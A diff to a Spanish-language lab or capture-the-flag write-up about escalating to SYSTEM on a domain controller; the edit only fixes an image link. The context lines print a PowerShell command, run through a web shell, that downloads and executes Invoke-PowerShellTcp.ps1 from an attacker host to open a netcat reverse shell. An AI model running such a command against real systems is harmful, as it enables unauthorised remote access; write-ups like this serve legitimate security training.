@@ -708,7 +708,7 @@ Nos pide una contraseña, esta contraseña es 123.
 ![Write-up Image](images/Screenshot_30.png)
 
 Y este servicio lo está ejecutando el equipo DC01$ por lo cual el usuario asociado es `nt authority\system`
-![[Screenshot_32.png]]
+![Write-up Image](images/Screenshot_32.png)
 
 Ahora ofrecemos de nuevo el `Invoke-PowerShellTcp.ps1` y ejecutamos `powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.80:8081/Invoke-PowerShellTcp.ps1') | powershell -noprofile` en la web shell para descargarnos este archivo y ejecutarlo, así obtendremos una reverse shell siempre que estemos en escucha con `netcat` por el puerto 443 ya que así edité el archivo anteriormente.
 
